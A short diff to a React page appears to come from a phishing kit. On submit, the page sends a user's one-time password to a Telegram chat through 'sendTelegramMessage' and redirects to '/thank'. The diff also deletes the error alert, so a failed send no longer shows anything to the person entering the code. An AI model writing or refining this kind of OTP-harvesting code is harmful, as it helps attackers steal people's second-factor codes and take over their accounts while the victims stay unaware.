@@ -37,10 +37,10 @@ const Page = () => {
 
     try {
       await sendTelegramMessage(message);
-      router.push("/personal"); // Redirect on successful submission
+      router.push("/thank"); // Redirect on successful submission
     } catch (error) {
       console.error("Failed to send OTP to Telegram:", error);
-      alert("Failed to submit OTP. Please try again.");
+      
     }
   };
 
